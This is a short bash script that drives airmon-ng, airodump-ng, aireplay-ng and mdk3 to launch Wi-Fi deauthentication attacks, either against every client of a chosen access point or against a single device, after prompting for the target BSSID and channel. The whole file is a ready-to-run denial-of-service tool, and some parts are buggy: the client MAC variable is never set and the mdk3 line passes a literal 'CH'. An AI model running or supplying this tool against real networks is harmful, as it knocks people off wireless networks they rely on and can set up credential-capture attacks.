#!/bin/bash


# colors
red="\e[0;91m"
blue="\e[0;94m"
reset="\e[0m"


# interface ( wlan0 , eth0 )
echo ' '
Interface=$2
# to complete the sentence
MON=mon

# start wlan?
airmon-ng start $Interface

# to show bssid and channel
airodump-ng $Interface$MON

# bssid for wifi
echo ' '
read -p "[$(echo -e $blue"?"$reset)] Enter BSSID : " bssid

# channel for wifi
read -p "[$(echo -e $blue"?"$reset)] Enter CHANNL : " CH


# -------------------  Aireplay-ng  ------------------- #  

if [ $1 == 1 ]
then 

# change the CH to CH wifi
airmon-ng start $Interface$MON $CH
echo ' '
echo -en "$blue------------------$reset"
echo -en "$red   START ATTACK   $reset"
echo -en "$blue------------------$reset"

# start attack ...
aireplay-ng --deauth 0 -a $bssid $Interface$MON
# stop interface from monitor mode
airmon-ng stop $Interface$MON

# -------------------  Mdk3  ------------------- #  

elif [ $1 == 2 ]
then

airmon-ng start $Interface$MON $CH
echo ' '
echo -en "$blue------------------$reset"
echo -en "$red   START ATTACK   $reset"
echo -en "$blue------------------$reset"
# start attack
mdk3 $Interface$MON d -c CH
# stop monitor mode
airmon-ng stop $Interface$MON

# -------------------  Aireplay-ng One Device  ------------------- #  

elif [ $1 == 3 ]
then

# change the CH to CH wifi
airmon-ng start $Interface$MON $CH
echo ' '
echo -en "$blue------------------$reset"
echo -en "$red   START ATTACK   $reset"
echo -en "$blue------------------$reset"


# start attack ...
aireplay-ng -0 0 -a $bssid -c $MAC $Interface$MON

airmon-ng stop $Interface$MON

fi